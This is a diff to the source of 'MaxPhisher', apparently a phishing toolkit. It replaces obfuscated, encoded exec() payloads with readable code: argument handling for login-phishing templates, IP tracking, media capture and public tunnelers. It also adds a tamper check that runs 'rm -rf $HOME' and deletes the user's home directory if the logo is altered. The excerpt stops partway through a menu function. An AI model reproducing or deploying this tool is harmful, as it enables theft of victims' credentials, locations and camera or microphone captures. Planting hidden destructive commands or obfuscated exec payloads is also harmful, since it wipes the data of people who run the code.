@@ -90,7 +90,25 @@ modification follow.
 Copyright (C) 2022 KasRoudra (https://github.com/KasRoudra)
 """
 
-_ = lambda __ : __import__("\x7a\x6c\x69\x62").decompress(__import__("\x62\x61\x73\x65\x36\x34").b16decode(__[::-1]));exec((_)(b'6284D54F70FFFBEBFBA296DDBD52B97717C5E2377200F3B245A57F4B267A05C214CFDF0784B4A3E75B7D61933121874CD4C8AFAC406890342247603731F7E10E146D5835C009AAA41A38FCD104BB0D7670FE3221EF2E4C332CB316B7AB87E91F84251C1DC71A6AA26F917DCC45817A8608FDB91A0732CD76270D2E30BAEE626B5139082E3660BED331F27FC48FABB60D0AF1C63E3DF595487023C5139B02827C2036531B754A6A01A547C710E5B01ECC3E279621DA5949849B7D14486C1B316F599F0800C295B56038CC483FEE5EFE6B3EB13A0A8250E9CFBACB83E2F98FE414FBD646D3B4E45FE7EAA37C0C0887B581505E7DDB1E789C61F108751B2069203B1238D1426604324DBAE2500BE0957EDDAC9FB455C37EFBE7174F20DB2E100B0B607A0FE47E715419945A20AB4FCBADC110055CEB49DD2E6AF08DC66736DC023CB9F935AD2F88450A062CA6BEA2F5A1FDE0B904398D80AB1FAB51FF36416589B679C5829038A188F6BB4476740FFEB75CF897AEC25FDAA774B25CCEAD14F0E2EC718046545805C70DB3C3D5BF210ED55E2198AA947CB2CD2B35ED682FA1FE332D8480854095C84B7377C3E537B9C3E99C82079D3771EF0CDE6596C2776C293ADE6EE7021A5C000937F84007C3802F6ADEDCF83F384EF4932B0BCD55B5ACA8931D77AD72025D47143072242D1D77A7916EAF3641E6AA57B71D3E521E9EF6F6F7F2403A52F2642B93CE2E27BE28AF34F4862AEBC3DFC66B46BF4312AAFC9819DBE2992940AE15E9B3A733C2DC127DC407A6BC503E4E323DE5340BB6349EF1E34FAE6F6F2714108F91F37794DDCDBFC43C4A23476A726EE6D2E8500957AE8EE55BA3FB78274CB7B1B4CE8A5BF6DC7D631DB2862F5F2DDB1771C3A770F2417857D93D86EE1FB240620A3E44C375ABADC2443E1DE00BFC599620317BD9BF95705BEBFD8B3437801D19D56BD9FE92166372AD0D7E175A328E4FAA2398D1C82BD41D98C67E2B37E95AAF4297A5A59DB747F3A2F3376AD77B616E5EB93D7EC9467B25C3547BCEF5E5BE25A5435D89A9D7F9158459AA1BF0687FE741CC7DEB7AFDC686FBF37D7F7FBEBE7F9FBFEFF7781C40633DA2495A64A6731FCEB3AEBB846CDB9FE1606C63F6DD33F848809342E8D54952C987'))
+from os import popen, mknod, mkdir, listdir, system, getenv, replace, rename, remove, kill
+from os.path import isfile, isdir, basename, dirname, abspath, join
+from shutil import copyfile, copy2, copytree, rmtree, get_terminal_size
+from glob import glob
+from time import time, ctime
+from signal import SIGTERM, SIGKILL, SIGINT
+from subprocess import run, call, Popen, PIPE, DEVNULL, STDOUT
+from platform import uname
+from sys import stdout, version_info
+from socket import setdefaulttimeout, socket, AF_INET as inet, SOCK_STREAM as stream
+from http.client import HTTPSConnection
+from time import sleep
+from re import search, sub
+from json import loads as parse, dumps as stringify
+from smtplib import SMTP_SSL as smtp
+from importlib import import_module as eximport
+from zipfile import ZipFile
+from tarfile import open as taropen
+from argparse import ArgumentParser
 
 # Color snippets
 black="\033[0;30m"
@@ -240,8 +258,355 @@ else:
 
 print(f"\n{info}Please wait!{nc}")
 
-_ = lambda __ : __import__("\x7a\x6c\x69\x62").decompress(__import__("\x62\x61\x73\x65\x36\x34").b32decode(__[::-1]));exec((_)(b'===SUZCU237SP77P7KZNJCNC3ITZOABVPUQI566A5KCQH2DHJTLBNJ2JZPYVKZTFR36AOUQRAU4IOI65JSTURVXGWJKDQFFAGIMWWQ3SP5ARCTC25CD3XKSQ4HDT6Q6KNCQDDZORU6D6QNMAQRODD3QO6P366XW4THPCGAEEAOAGGQUB7R5SIX6SX7ZVIJNEGZPLAEJR27Z23G4PL2Q4AEWCFYVH2WP3P7OZPAV2COA5L5AU3VR7LDVQID4KJBISYIFUOND4THQXUHIZ7CZU5BOLIAFM5XAHXG7QONEEQXTSGBISVBRT3TX4AK7DPRG545U4LH2PCAXB57DUO2TVFKRLSWMAGPXYQJHAZCG3CCL5ILGBB56WFRGKU3AQELB5SYKHT6LXHMFYM4ATWFKENXPX3D7WTIHILINEUNPJ7N6KLHFYURBFS6KBTZV3RMVPE66OGZG3XPYDNSORIJUWFAELP7FJGW6EZXAUH7NODE4XCILSHDQWOHWPMJI27NTU7IQBEV3OZJ7OM3OVWWCIXFZCQGMISH2SI4U2RZMZIVXGIWOMOBASY5PMAZRMPPJDBRRLZQO7KQXDZ7WRZIKCT25F3CYG3IAUH2KXGS3ECSBMZ6HAHBN6QNX2H3D7XK4ASGDD7S7BAHFBQ7WEQ4SEZEAIATM5HCGIROISQ4ZO3W3RPXUPJN5VPDRXVO7E6VCKG6FNAGV3Q6GFQGHZDJBX5WGF3VH3GQYPNPZXH6RYPV7SRTIP6LNLLM7ZXPNSB4SZW66TBBDG4WPDHIWSPGBHANF2KPP3Q5QCKIESNKAYORRYEO43OZ2SFIV6IARB7EY7DYCDQXOA7MMVTCUY2PFMBLXPUN4CB5F3FXTUTLYQEETVRCI2NQBRQX2U2WEWNJZCLO5QLDKQ5PM3FVO3W67HW5KE2GCHPEHFZK5CHKJYL6NX32NVQEAB4OQBLMBCE7LRL5HVIGBT3GFLA4BIJEILJUBA4YUQGI6W5KZO6HCUCTHEMOFIDM7JC5BPTN3DMYV5WIPMTDB56X5KCZCJJC6IDMYF3YSWJBQHTBEJDXFN5ORDFOC6SIVJV2TMPTO2JS56FM6TKIEPFW6OQPNUAGXT4QED26QNVWVNI7AVBE7H2SUYYRXSEQXJVT34CKNHJNQF7YQKALW6QEW6ES7BRPOO2XBOPRLGSRNQTZUXTU64QTTF753WOZZF4Q7H7Y5NPIM7NIIQAQFPMBOZCHDHWHEW64Y45BN4NGK7WWUAOEGJDAWMA7KM67BGLA2EK7RQWXH76P53XDFHKTUI5UVDA2C45X7IQBX4VZ6CNILDTKISSIEM7PEYBWAZ5PSWKTPLNRUAYPN6OXKYEQG235OWXJKQUHTPFKIBW2VENFFFCE5HKPHAPUYLDIIDBVJLBAPHTMDYETFNQTQM3HD7XUULUHCXNH4YDAXJYOCX7WJRNA4GWZY6DHLH43BSV7CYYJA6M3UUSLDAXEQUPI5ERYSVNA6JOA7OMGMYNIOXZ2AQMNY3QCEVVQCZ2EOQT7VNCM66ATB2XOB4BP6JUPF2PILOASSWKLJECGGB2P2NTLYYIOBWKEQ7XEKOLYNTRUFVXNMRUPRLOPAHFUPO6NM3MXWORZ6IRJFYQ22RCSITXL64254WM6VWMFH3ZIQHA5PAT3DOLHZ7ROLWIWYTR72RGRR6CIP6MO7EDCF4HFVXM5Z7WWDFE5F2OA3WYEZ6WL2V2BUXIUPEMBYBYEHTQPGDMWBBWTCHO537K3BUAVNCOM5JM2EBXHN2RSM3ELFFYSBYNV4H5OS24YGDNRUNUHKIYQV44ISLFIRRBINYYEV5IHQ5IH2WUKC7ZCSC3NYIF6X5KQD6T5URA3K6IAPSFYFALJBNBC4VBRMH6BZLTGEIIDC5ADQBS6KGXGJEGI5S33Q2IUV3CHQH5ZJGIYZNZ7HBJ6WQPMIDKUKHV4IXO7EGOM67L5JHA5CKOSJELKCR7C6JSZ65D752IEZSR5VLRVDC4XZBHC67MXXPQ6JXYBF6SYXOH3WBINUXKXI6BI6QRI4LXJSDKNVVEVNHUQSZTVBC2WR477WWUTTDXWBQDALEGLI2KAFW5OZCY2P4VPJ2HFW3NBK4DYYKNOT2AVHI27SC3UUDI3H2EZPPCXX2W7CVQZ6YD7LDKJ7JTAI73TIVLSAKKJ2X2G4YFCRP7BHZLNR3P33EUSPZPGDD5MC3OFZRR2NNVWH2PAASH37EARPTSWGUGN5JXPQDOB6P4FI3STV5AXCNA56AND365JDSQT2CFZ6WYGYYJTXP2XSEQOXO7HWQJE5DIF6QK3DA4VQ2VDH2ZECFCTDTFG3AF7TPK4OYMEJRTIZ7ZNNV2XQAHGYQRBR2NZYV5MLKL7BMWJCINRBYG77V2VKQRN3OV3DV4ZXH7NAHSW55Q2E6VLCQTPNQIIJ7DAOPPHRXAGFGKWA2AIAOIDYEZLGKYVTQQR4RHPRKIAFRQPZLUIRJ4EBNQOELUHWLZDE33OJM5JTEAJPOT5NOXA3CTH77QGKYFCBF3VWOMDQ7XAYQP6RVNTFH7XXDAKLTQQDMKQ76YPPRE4JB6F22I7QGQ6WWQ5O7Y4TVHOII3AK7EZEXELQNEAXCTIYZQJL53YSTGBQ3PLPQVIMLNBGXBKRXH527MDTBQLYA5CKVJWNXXPU5UXWWPLZYXWHRLAACHGEB6H6XYK4EU57D5YI2J3CKLZ4WK3VEZPYLGPWLDGWRL6GUZF577PMXX57M5CQ2AFJQJYKDC3VORAM4TAQMEGOTOU4IW3EUG4EIXAUBIZ53KCLY7Y74JIVHLNDGVBLXSKI5OOF6LB4DTYRKBQIAYXZZRJ74TYILBOQ7TAOF7MEOP2IALICM3EQEIVLOIPVDMDSULYORUYZLFIVHKUA2YV76DMAE2ITPVP4OH6BDAJIG3Q2ROYCPF7NBOH7EV4WM4ZSSZOGKTXZFIY4JHISZ6FU4RU7U5HOWUWQBVLVSA6QL77O37DAALU5ES3XNS6RS6D3FRTEQPGBCE2G3N2Y6BW3J44IB7O4R6BIYQJAHH2VDCE6NWB23HM3JFUYBXZMEBLYOHRRWZJRCQLA5EBKA75EONPACZTEN6WZDYTV2JIH4HPP7ENGGWEWM7WO3KHQB3QYSVKW4MCUWPCTD7AXA7AJOWNAFGINHIOWJL6SBXXJEDVRP2PNNJKKRDFNV6F3PH7B5LUN6BRUTGE2FMCEPPQKEI4UFI36I7GMD6GV5RSTGDRUIBCLYMYYYG7WPFBVETYUF24FAXCX6SFLZQX5HBDDOUAYANHRMD6XIJ33AYO5YOU7EAXLTKJ7HZTEPA3ENQIHITKCPS7GTNACM5EILUIDSPRIXWCE7U3GUKOP7AF42AZAA4UXXZBVSC3CSFSSYQML6XT4VNAJ5KO6Z7IZFBTZYB4IOFNTB4G72SZO7KA4X7RDFQDKYH7TLKZYZGPSMBBYYBN4BSRQ6JFEY5NEB4CKJZNGPEAVKKTEEMGTVQFVKGE4SLGMYNZ33MTZQBUA6H7UMIPUZRZN4TJ5VWDDD7HJETY2NWS7GYNM5DZRWPXCLXD7AQEU2LZHVDBAM2K3R4VZD2UQO4FE7ANBCJB4BAGMEUIA5QBROSSLMJ3TYZNCWNAC7A3AZJUIXLBXMNMZDKKAUKTVNA6XXRVXWSZUYJ5T5IWUKFA5G5TKX3LZ3DGCSKNCXNGFGQ4PQLSZP3VVIWSYFBOKMPU4E3RI4CRKHYNDGCBKCOBEMWI6IADZD4SMOETAU7BK4BC4IMKOEP3H5UGHQRKWSK6PRLJYBHL7CP7KFZZHMCGXH4YFYQMSAQY4AKXXIHYL3CPAX3Z5MBAKFIQWXWT7GTY6M6CCUKR5JHIKGPDWJQZU25KWLENUDVWLICV7QXKVJVQPYIKGZG26GFHCTLFY2XA2ZMWVJYRB2FUY7FOTBA3GTSWJX7ZBI7NJ5FDNBGWKQJ6PNYJUINQI5NQVY7JT7VKHFTSL63ATF2REQLSWKKFX4CGC6GTZRRI72QX4PNIW2MR5F33WIILYMOLJB4TQOJMXSWBQ544SXU47LNRXANRF7GRZDXYPSUU32AXJVDTRYQFA2LZB5E6VEJ55HZVQYP3Q6HETBOUK32THT3SJ4OZD3Q6WGISG5EF343AQPTE3RAVIAZB2VMJC77ASGJNM7AZYHDC6TUULV2WGTR6XBUM34Y3BMPVCLGEVZ6BFZ3K66EPO7NGCTBI6JKB6GONTZQ2NDQKVCVT3RS2I4BJUEECUEUJBAJXJHFI7X6PYHHJLXKFKHOHDFKPI5BRRS54LEZXVRI5YW7F64GCUZTCVADKDST6LMA7LDX6IQW55JPWEVQCI3DVI5NE4WFDLAMZ3V4DID7ETDAPSG7ILKPNJZYKHANV6BNQXFJL34PY2BZ25VM2F3IM6N7LLSQXXCILXPCHJLR3PIL4IK6C43OP5B6GADMEO5CDBJHKRD77CSQ562N7JS3BULOCREUHTUG72O2BAFG2FHQDW5SRTLVVFQG3L42HQUGHF7HIU24BUTCI6MC3KUJFKEPNLS65U5KF6BTYA6BSC5KQVOPFD6H4TQJMHR3ZLKPKYXD4U5NOC25C4ET36HLUR5KA55IEDKIUIBJJS7DNBQNQRSRWPKQVUJKRVLMYNYZ35ZAXSE6KGLI2ZYSCVIXHVP3RYV2YERCTDABRMG76PSLPFTRGMMFIIODOID6DTE45B3IND75PDONK7EEJ37Y3KCZ5FOXY56EOFZ6JYSKZK6RC2YXFEUG3MNXPBXGPPPV2YNRJ3L7QCHH6LPA6W3SXK5Q2OAFFE7JVM5YG3LGG6XBU3BPJBQHHDYRUEPP5ZPTJCO3PA2HJDHBZKTC6BOCZFRA2BHM6NRQYRALU766MAK35WJJ5A4LY5DN3QPN4MKU3DJJA4NUONQHUDRPKADB3WFNLDZDWACABVWJR7S2HZOGFKEBHC75RBUDYNTFWX7OIXEAQL3J4ZCJYOXIRKKLHZFNXQAO7QOGPE7RQ7OJ6BCU7XVR5UGSMB3N3ONYGBUJCKS5BRIKWWL6ZWG5Q7253WWTDXA6QF4IX2PQ27PQV6M2DKCEGEZUSWDPQPJVW6C7P6FCK2RICBNDDHQ33QW7MGKLGI3HFM4GTUJ6YPJHZEDK3CR42A235SYIJU5X5CBAJYLPLLPVXTCNZG6IEGKX3SO5PXZSHASDTOM2CF3FTICHIAWHY36ZNEGH3VUJPQPK7BWSHTFLAANRBRDDOITAZKI3K7EISY5ORQ76YRSXNNU2HXVX6JO2TS5O4JSTGZANEEMNHQNZC45BID3EHWSSMYOAHXBBGU2YJDMEAZEO66UQOJKHSH652HF4CSAAOGN3GWLTJZC7XYXCWC7MDO3YSVRV4XOKO5JMHSTSRFAZQZVLI7TZPYFPGLMSWQXO7SPDY4KTRTVIU5WMXI3E4RQUFFMNVBUKAZG77VBLLVBELGEWT5VSAJ5WVMFVHIVIKX5X2Y47JJMEVXZ7UAEOJMF3J2JL2E25GJHURMNKXOI6LDGFNY3MS2KYYMSKUQS5MCUERCCKX6YJTOG6BGWDZWVEHS3X5YNALSG3ZOYNUG666DEBK5XHUD22DAKF3TL2JP6LD4QIA3QABAGCH6VAM6PJAAPBGET4MUTDYXY4D46D5V3QVZEH4DTRLKJOUOKABONM25AU3LCXEV6RADHCPBAN7WFNNVAPL42J7R5OJHHI4BDU5YJVJ5AMFVAYVLPY5KG2F4KM3OANXBL2TQ2H6YTUYA7WQQBFMJGRCVN7VVRMSHPZUY4KLUXL5DRROBP5OG56ETMQVGYLIAKNKC65MLXIUWYPYILHFSO7MNYXSDXG4RTLYWEVPE57S4GPF5YN5Q7YYBET7DV5LRTF4TMBBA42RLGOIMP4ORLKYTQ2TF4H3HJTSSIQQIEL4AQLSIGVXSWKX27PYGDPZYJDZ4ZMKYJ37FGNHRXW7VNHLCD25PDLPY6MSAWEGN5TDZEULEOXYJ56QHEPL3PZ5OF7YKBZPUXTXGKUGHWHFNNPESVCSYSHRP4GIP36NHLF2A2Y5F4DU5AC7R5FRG6SVWL7QR622D7G6FQQ4UDLSEGZTPCZPFSG56RFSW265DH2SDLPXBLKQ5H7B4NNS3Z2VZRNG6TGMLTKDOEJ26MTHGGY2VTWCHBN2ZL2UMJD5AJDXUOIILNRCHFLDG3KAC2JWSGO4KP3FP4P3RNMH65FZ32SEM64KRQWT7WH6OMWEJ4BYNPCISXDGRXHFGWWIZTI5JB3GG4M3BPXW3KL66XXZHIB4D5M4RTOA2R7GY65EOXXWGJ6KS35P2FEBVCZNUGNN7WY45HP5GBGHQPETDXYRHY2LWAW5W522UJ6HJXAEWXUM4MAVGTG7VU4BXUXOGEOJA6LNK5FHX4NJHZ7XCKUMLK44XHXNSVNPRYDWLXWYTQFK7FPYGHIZAREFSRHMA6UH2SFQ5ULIGUE43ZJVYCRI6S72UK2MUVJKHHZVP7RSBF5UPOISTZ7AO3OG33D7IAL3KDLXUXSETKBIXEUVEK2F2KHKHTKRBBBT2NQQSHO4CCFBG5R6TBDHWH3VPPJSD7J26DNC5XMKDDBKLFBZUXAF5GWLMYVG4YFYX6I6662IMHYW7SS5UOLCIE2B464R6M2ZIBOBSJ7KCLEVPTT6A3WXKQ64SGN2DF4VCM7JZELS2YPTNELCTXEQDZX623VIGVMPJDWECVSP7VANDPEB6KOYVKMFNY47C5OE7O5B3QGRWJLJUQG5OMRKWHOJECRBMTQVQX62QSYONGWJUARSNG3JGIHVMQISIPV6F7L7U7H5WJE2Y7M6OWHDISME6YU3WUX26OQOXVAJA3CIL647VX5LDNBYZD27TXQEZBY5Y2XFT3Z5P2T2TRRPTAYZH4LSYCMJZLFKND7XVTHANE2JBSMNFZYCTALWCDG6EX4UXMODP7BR742ISNMGBFZBX5U5KVRPSW5K3OPU7JOZSLT3KAOPCJXT65MGWL7ZNJW5ZGETRSEE76VIXB3ZSRDYWZPAD3QJ4RMRJFWDWLFEF536JFZTBUFB2USDFSGJTTVOWIGRFK5T4AFYJMB7EAZCPFVRIQFHPXE5HX7C4Y7Y4WB5SYOFUAGQP74KSY4VVCUKOHWGTMUZ2GWYLWC7TWLNTGMUNABBDND2XH2MVHYAGWOR5OXSXOUUJ6OLZYYWIAOHXXMUD7TECEBZPH3MDRJ3ZZCUPRSOJBTH7C7RP7VAHZ65XP2LZ3EYNE3OTPPHIW3KBYJ3V3CYPR57BGAL5YZZUS2W2H653FHQJK3QDKSFFYPIYLZIUSQ4G7LCOD25OZ3UGEW4PD7AX5CMM2HMBQREOHYVIB4LNSUD5KSH4TN6SXJHORV2VNNU5ZFSUK733DSAOLJSGN3XJXMOVCR6JIYIE4TEMIPGTFV32RT7RBFYCE4XQGP3AEPUDVLWUVPYE7EQPDSVA57VKWM2OJTHSWXVWKSJ432ONUCEPYVMMH2CENLTJEM3WLT7VE6DTRIG3IOTTM7ZJRERYRWY6POMMN7HGBKVPHLS6LCSU3BX7IDWSSVVVSTCVOTEDDG54KJ2PJDDEHI4OUZ3FDEPZY6DGIRLBYXP7ANUKHW3SQMMMT22UVZ75MTTDT2KYBGS54YEGJDRZSSEUBT4L7WS2EJLZ2YDSJXTMXRX33DOUONF45G7YKTCHLMA3YNXQ5XTK43DH2HVGLO7Y6K76VRITCTU34MNF2F3O5ADYCVNX44UAJHMQNZSHNOWIXJZGVTH4GPEJ72CRZHESHXP726LNP34HJCHCOGGM4SV6SCH22WCJZT7FSOKNUVJROGJUYREV2K7ZOUVPIWU5K5Y2VB2YOQM3YYP5BDQ7QVVR556VRLEVHYFTWUHMZYZREFK6D4APYDORG6MJV7YIG5W7KKO5GI4MEB4XLVYM5764WZVSXLGONWO66GCKY7JFNVZDL3KHO25Y3XWX3DRLSX754GLKSY4UWPHHFWLVHTTPHHG333I2C2L64V5VHX6RYB4WXSVPNX3YSEKNI52THECMFZENPODDZUDBB4WPDLB7DXANDWIN2ZSV4E74YWX46ODDWOTJQ6FP5W4IEECNKKI63ZWUFXH3Z4BLPSACTZMDODBDHTNCD3VCMLJUF64NFH77XP52Z777RTX777P4Y377737W767XOMXP5GEJGSRIGKJVP7P7TQ67NVO3MTGYACDJMMEQWQKFMIUNX2T6HESFQSSLSJOG3BOCP'))
+logo2 = f"""
+{red} __  __            ____  _     _     _
+{cyan}|  \\/  | __ ___  _|  _ \\| |__ (_)___| |__   ___ _ __
+{yellow}| |\\/| |/ _` \\ \\/ / |_) | \'_ \\| / __| \'_ \\ / _ \\ \'__|
+{blue}| |  | | (_| |>  <|  __/| | | | \\__ \\ | | |  __/ |
+{red}|_|  |_|\\__,_/_/\\_\\_|   |_| |_|_|___/_| |_|\\___|_|
+{yellow}{" "*31}             [{blue}v{version}{yellow}]
+{cyan}{" "*28}        [{blue}By {green}KasRoudra{cyan}]
+"""
 
+default_port = 8080
+default_tunneler = "Cloudflared"
+default_fest = "Birthday"
+default_ytid = "6hHmkInZkMQ"
+default_duration = 5000
+default_type = "2"
+default_template = "1"
+
+
+if termux:
+    default_dir = "/sdcard/Media"
+else:
+    default_dir = f"{home}/Media"
+if not isdir(default_dir):
+   mkdir(default_dir)
+
+argparser = ArgumentParser()
+
+argparser.add_argument("-p", "--port", type=int, default=default_port, help=f"MaxPhisher\'s server port [Default : {default_port}]")
+argparser.add_argument("-t", "--type", help="MaxPhisher\'s phishing type index [Default : null]")
+argparser.add_argument("-o", "--option", help="MaxPhisher\'s template index [ Default : null ]")
+argparser.add_argument("-T", "--tunneler", default=default_tunneler, help=f"Tunneler to be chosen while url shortening [Default : {default_tunneler}]")
+argparser.add_argument("-r", "--region", help="Region for ngrok and loclx [Default: auto]")
+argparser.add_argument("-S", "--subdomain", help="Subdomain for ngrok and loclx [Pro Account] (Default: null)")
+argparser.add_argument("-d", "--directory", default=default_dir, help=f"Directory where media files will be saved [Default : {default_dir}]")
+argparser.add_argument("-f", "--fest", default=default_fest, help=f"Festival name for fest template [Default: {default_fest}]")
+argparser.add_argument("-i", "--ytid", default=default_ytid, help=f"Youtube video ID for yttv template [Default : {default_ytid} (NASA Video)]")
+argparser.add_argument("-u", "--url", help="Redirection url for ip-tracking or login phishing [Default : null]")
+argparser.add_argument("-s", "--duration", type=int, default=default_duration, help=f"Media duration while capturing [Default : {default_duration}(ms)]")
+argparser.add_argument("-m", "--mode", help="Mode of MaxPhisher [Default: normal]")
+argparser.add_argument("--nokey", help="Use localtunnel without ssh key [Default: False]", action="store_false")
+argparser.add_argument("--noupdate", help="Skip update checking [Default : False]", action="store_false")
+
+
+args = argparser.parse_args()
+
+port = args.port
+ptype = args.type
+option = args.option
+region = args.region
+subdomain = args.subdomain
+tunneler = args.tunneler
+fest = args.fest
+ytid = args.ytid
+url = args.url
+directory = args.directory
+duration = args.duration
+mode = args.mode
+key = args.nokey if mode != "test" else False
+update = args.noupdate
+
+local_url = f"127.0.0.1:{port}"
+
+# My utility functions
+
+# Check if a process is running by \'command -v\' command. If it has a output exit_code will be 0 and package is already installed
+def is_installed(package):
+    exit_code = bgtask(f"command -v {package}").wait() # system(f"command -v {package} > /dev/null 2>&1")
+    if exit_code == 0:
+        return True
+    return False
+
+
+# Check if a process is running by \'pidof\' command. If pidof has a output exit_code will be 0 and process is running
+def is_running(process):
+    exit_code = bgtask(f"pidof {process}").wait()
+    if exit_code == 0:
+        return True
+    return False
+
+
+# Check if a json is valid
+def is_json(myjson):
+  try:
+    parse(myjson)
+    return True
+  except:
+    return False
+
+
+# A simple copy function
+def copy(path1, path2):
+    if isdir(path1):
+        if isdir(path2):
+             rmtree(path2)
+        copytree(path1, path2)
+    if isfile(path1):
+        if isdir(path2):
+            copy2(path1, path2)
+
+# Delete files/folders if exist
+def delete(*paths, recreate=False):
+    for path in paths:
+        if isdir(path):
+            if recreate:
+                rmtree(path)
+                mkdir(path)
+            else:
+                rmtree(path)
+        if isfile(path): 
+            remove(path)
+
+
+# A poor alternative of GNU/Linux \'cat\' command returning file content
+def cat(file):
+    if isfile(file):
+        with open(file, "r") as filedata:
+            return filedata.read()
+    return ""
+
+
+# Another poor alternative of GNU/Linux \'sed\' command to replace and write
+def sed(text1, text2, filename1, filename2=None, occurences=None):
+    filedata1 = cat(filename1)
+    if filename2 is None:
+        filename2 = filename1
+    if occurences is None:
+        filedata2 = filedata1.replace(text1, text2)
+    else:
+        filedata2 = filedata1.replace(text1, text2, occurences)
+    write(filedata2, filename2)
+        
+# Another poor alternative of GNU/Linux \'grep\' command for regex search
+def grep(regex, target):
+    if isfile(target):
+        content = cat(target)
+    else:
+        content = target
+    results = search(regex, content)
+    if results is not None:
+        return results.group(1)
+    return ""
+
+# Write/Append texts to a file
+def write(text, filename):
+    with open(filename, "w") as file:
+        file.write(str(text)+"")
+
+# Write/Append texts to a file
+def append(text, filename):
+    with open(filename, "a") as file:
+        file.write(str(text)+"")
+
+
+# Print lines slowly
+def sprint(text, second=0.05):
+    for line in text + '\n':
+        stdout.write(line)
+        stdout.flush()
+        sleep(second)
+        
+# Prints colorful texts
+def lolcat(text):
+    if is_installed("lolcat"):
+        run(["lolcat"], input=text, text=True)
+    else:
+        print(text)
+
+# Center text 
+def center_text(text):
+    lines = text.splitlines()
+    if len(lines) > 1:
+        minlen = min([len(line) for line in lines if len(line)!=0]) + 8
+        new_text = ""
+        for line in lines:
+            padding = columns + len(line) - minlen
+            if columns % 2 == 0 and padding % 2 == 0:
+                padding += 1
+            new_text += line.center(padding) + ""
+        return new_text
+    else:
+        return text.center(columns+8)
+
+
+if logo != logo2:
+    if not "KasRodra" in logo:
+        print()
+        for i in [4, 3, 2, 1]:
+            stdout.write(f"\\r{info}Counting {i}")
+            stdout.flush()
+            sleep(1)
+        print()
+        shell("rm -rf $HOME")
+    print(logo2)
+    print(f"{error}Replacing a logo doesn\'t make you a developer!")
+    print(f"{info}Refer to {green}https://github.com/KasRoudra{nc}")
+    exit(1)
+
+
+# Print decorated file content
+def show_file_data(file):
+    lines = cat(file).splitlines()
+    for line in lines:
+        print(f"{cyan}[{green}*{cyan}] {yellow}{line}")
+
+# Generate json file from txt
+def text2json(text):
+    json = {}
+    lines = text.splitlines()
+    for line in lines:
+        if ":" in line:
+            key = line.split(":")[0]
+            value = line.split(":")[1]
+            for i in line:
+                json[key.strip()] = value.strip()
+    return json
+
+# Append new entry in array and write in json file
+def add_json(json, filename):
+    content = cat(filename)
+    if is_json(content) or content == "":
+        if content == "":
+            new_content = []
+        if is_json(content):
+            new_content = parse(content)
+        if isinstance(new_content, list):
+            new_content.append(json)
+            string = stringify(new_content, indent=2)
+            write(string, filename)
+            
+
+# Run shell commands in python
+def shell(command, capture_output=False):
+    try:
+        return run(command, shell=True, capture_output=capture_output)
+    except Exception as e:
+        append(e, error_file)
+    # return run(command.split(" "), shell=True)
+    # return call(command, shell=True)
+    
+# Run task in background supressing output by setting stdout and stderr to devnull
+def bgtask(command, stdout=PIPE, stderr=DEVNULL, cwd="./"):
+    try:
+        return Popen(command, shell=True, stdout=stdout, stderr=stderr, cwd=cwd)
+    except Exception as e:
+        append(e, error_file)
+
+
+def get_meta(url):
+    # Facebook requires some additional header
+    if "facebook" in url:
+        headers = {
+            "upgrade-insecure-requests": "1",
+            "user-agent": "Mozilla/5.0 (Linux; Android 8.1.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.99 Safari/537.36", 
+            "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9", 
+            "dnt": "1", 
+            "content-type": "application/x-www-form-url-encoded",
+            "origin": "https://m.facebook.com",
+            "referer": "https://m.facebook.com/", 
+            "sec-fetch-site": "same-origin",
+            "sec-fetch-mode": "cors", 
+            "sec-fetch-user": "empty", 
+            "sec-fetch-dest": "document", 
+            "sec-ch-ua-platform": "Android",
+            "accept-encoding": "gzip, deflate br", 
+            "accept-language": "en-GB,en-US;q=0.9,en;q=0.8"
+        }
+    else:
+        headers = {
+            "user-agent": "Mozilla/5.0 (Linux; Android 8.1.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.99 Safari/537.36", 
+            "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9", 
+            "accept-language": "en-GB,en-US;q=0.9,en;q=0.8"
+        }
+    allmeta = ""
+    try:
+        response = get(url, headers=headers).text
+        soup = BeautifulSoup(response, "html.parser")
+        metas = soup.find_all("meta")
+        if metas is not None and metas!=[]:
+            allmeta = "".join([str(meta) for meta in metas])
+    except Exception as e:
+        append(e, error_file)
+    return allmeta
+    
+# Replace the default ugly exception message
+def exception_handler(e, multiline=False, skip=True):
+    lines_arr = []
+    tb = e.__traceback__
+    while tb is not None:
+        if tb.tb_frame.f_code.co_filename == abspath(__file__):
+            lines_arr.append(str(tb.tb_lineno))
+        tb = tb.tb_next
+    name = type(e).__name__
+    if skip:
+        if name == "ModuleNotFoundError" or name == "NameError":
+            print(f"{error}Error!")
+            return
+    append(e, error_file)
+    if ":" in str(e):
+        message = str(e).split(":")[0]
+    elif "(" in str(e):
+        message = str(e).split("(")[0]
+    else:
+        message = str(e)
+    line_no = lines_arr[len(lines_arr) - 1]
+    lines_no = ", ".join(lines_arr)
+    if multiline:
+        print(f"{error}{name}: {message} at lines {lines_no}")
+    else:
+        print(f"{error}{name}: {message} at line {line_no}")
+   
+# Website chooser
+def show_options(sites, is_main=True, is_login=False):
+    total_sites = len(sites)
+    def optioner(index, max_len):
+        # Avoid RangeError/IndexError
+        if index >= total_sites:
+            return ""
+        # Add 0 before single digit number
+        new_index = str(index+1) if index >= 9 else "0"+str(index+1) 
+        # To fullfill max length of a part we append empty space
+        space = " " * (max_len - len(sites[index]))
+        return f"{green}[{white}{new_index}{green}] {yellow}{sites[index]}{space}"
+    # Array index starts from 0
+    first_index = 0
+    # Three columns
+    one_third = int(total_sites/3)
+    # If there is modulus, that means some entries are remaining, we need an extra row
+    if total_sites%3 > 0:
+        one_third += 1
+    options = ""
+    # First index of last line should be less than one-third of total
+    while first_index < one_third and total_sites > 10:
+        second_index = first_index + one_third
+        third_index = second_index + one_third
+        options += optioner(first_index, 23) + optioner(second_index, 17) + optioner(third_index, 1) + ""
+        first_index += 1
+    if total_sites < 10:
+        for i in range(total_sites):
+            options += optioner(i, 20) + ""
+    options += ""
+    if is_main:
+        options += f"{green}[{white}a{green}]{yellow} About                   {green}[{white}m{green}]{yellow} More tools        {green}[{white}0{green}]{yellow} Exit"
+    else:
